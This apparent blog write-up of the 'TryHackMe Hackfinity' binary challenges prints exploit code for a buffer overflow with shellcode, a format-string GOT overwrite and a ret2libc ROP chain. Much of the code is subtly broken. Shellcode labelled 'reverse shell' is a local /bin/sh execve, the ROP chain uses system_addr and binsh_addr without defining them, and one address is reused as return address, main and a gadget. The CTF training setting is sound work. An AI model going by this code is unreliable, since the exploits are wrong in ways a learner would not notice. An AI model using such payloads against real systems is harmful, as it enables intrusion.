---
layout: writeup
title: "TryHackMe Hackfinity: Binary Analysis"
date: 2025-06-15
author: "ReverseEngineer"
category: "Reverse Engineering"
difficulty: "Medium"
tags: ["RE", "Binary", "THM", "Reverse Engineering", "Assembly"]
---

# TryHackMe Hackfinity: Binary Analysis

Our approach to solving the complex binary challenges in TryHackMe Hackfinity 2025. This writeup demonstrates advanced reverse engineering techniques and binary exploitation methods.

## Challenge Overview

The Hackfinity CTF featured several challenging binary analysis problems that required deep understanding of assembly language, memory layout, and exploitation techniques. Our team successfully solved 8 out of 10 binary challenges, securing a top position in the competition.

## Tools Used

- **Ghidra**: Primary reverse engineering tool
- **GDB**: Dynamic analysis and debugging
- **Radare2**: Alternative disassembly and analysis
- **Python**: Scripting and automation
- **ROPgadget**: ROP chain construction

## Challenge 1: Simple Buffer Overflow

### Initial Analysis

The first challenge was a straightforward buffer overflow vulnerability in a 32-bit ELF binary. Let's examine the vulnerable function:

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // Vulnerable function
    return;
}
```

### Exploitation Strategy

1. **Pattern Creation**: Used pattern_create to identify exact offset
2. **EIP Control**: Confirmed control at offset 76 bytes
3. **Shellcode**: Created custom shellcode for reverse shell
4. **Exploit Development**: Crafted final payload

### Final Exploit

```python
#!/usr/bin/env python3
import struct

# Shellcode for reverse shell
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Buffer overflow payload
payload = b"A" * 76
payload += struct.pack("<I", 0x08048532)  # Return address
payload += shellcode

print(payload)
```

## Challenge 2: Format String Vulnerability

### Vulnerability Identification

The binary contained a format string vulnerability in the logging function:

```c
void log_message(char *message) {
    printf(message);  // Format string vulnerability
}
```

### Exploitation Steps

1. **Leak Addresses**: Used format string to leak libc addresses
2. **Calculate Offsets**: Determined libc base address
3. **GOT Overwrite**: Overwrote GOT entry for system()
4. **Command Execution**: Executed arbitrary commands

### Format String Payload

```python
# Leak libc address
payload = "%p." * 20

# Overwrite GOT entry
payload = "%134520831c%7$n"  # Write to GOT
```

## Challenge 3: ROP Chain Construction

### Binary Analysis

This challenge required building a complex ROP chain to bypass ASLR and NX protections.

### ROP Gadgets Found

```bash
$ ROPgadget --binary challenge3
0x080484da : pop ebx ; ret
0x080484db : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048532 : pop eax ; ret
0x08048533 : pop eax ; pop edx ; pop ebx ; ret
```

### ROP Chain Strategy

1. **Leak libc**: Use puts() to leak GOT entry
2. **Calculate system()**: Add offset to leaked address
3. **Execute system()**: Call system("/bin/sh")

### Final ROP Chain

```python
# ROP chain components
pop_ebx_ret = 0x080484da
puts_plt = 0x08048320
puts_got = 0x0804a018
main_addr = 0x08048532

# Stage 1: Leak libc
rop_chain = b"A" * 76
rop_chain += struct.pack("<I", puts_plt)
rop_chain += struct.pack("<I", main_addr)
rop_chain += struct.pack("<I", puts_got)

# Stage 2: Execute system("/bin/sh")
system_offset = 0x3a940
binsh_offset = 0x15902b

rop_chain += struct.pack("<I", system_addr)
rop_chain += b"AAAA"  # Dummy return address
rop_chain += struct.pack("<I", binsh_addr)
```

## Advanced Techniques

### 1. Heap Exploitation

For heap-based challenges, we used:

- **Use After Free (UAF)**: Exploiting freed memory references
- **Double Free**: Creating overlapping chunks
- **Heap Spraying**: Filling heap with controlled data

### 2. Advanced ROP

- **Ret2libc**: Returning to libc functions
- **Ret2plt**: Using PLT entries
- **Stack Pivoting**: Moving stack pointer to controlled location

### 3. Bypassing Protections

- **ASLR**: Address space layout randomization bypass
- **NX**: Non-executable stack bypass using ROP
- **Canary**: Stack canary bypass techniques
- **PIE**: Position independent executable analysis

## Lessons Learned

### Technical Skills

1. **Assembly Language**: Deep understanding of x86 assembly
2. **Memory Layout**: Stack, heap, and binary structure
3. **Exploitation**: Various exploitation techniques
4. **Tool Usage**: Proficiency with RE tools

### Problem-Solving Approach

1. **Systematic Analysis**: Step-by-step binary analysis
2. **Documentation**: Keeping detailed notes during analysis
3. **Testing**: Validating each step before proceeding
4. **Collaboration**: Team-based problem solving

## Conclusion

The TryHackMe Hackfinity CTF provided excellent opportunities to practice advanced reverse engineering and binary exploitation techniques. The challenges ranged from basic buffer overflows to complex ROP chains, requiring both technical skills and creative problem-solving.

### Key Takeaways

- **Practice is Essential**: Regular practice with different types of binaries
- **Tool Proficiency**: Mastery of reverse engineering tools
- **Methodical Approach**: Systematic analysis leads to better results
- **Continuous Learning**: Stay updated with new exploitation techniques

### Future Improvements

- **Automation**: Develop scripts for common analysis tasks
- **Tool Integration**: Better integration between different tools
- **Knowledge Base**: Build a personal knowledge base of techniques
- **Community Engagement**: Participate in more CTF competitions

---

*"The best way to learn reverse engineering is to practice on real binaries." - ReverseEngineer*

**Tags**: #RE #Binary #THM #Reverse Engineering #Assembly #Exploitation 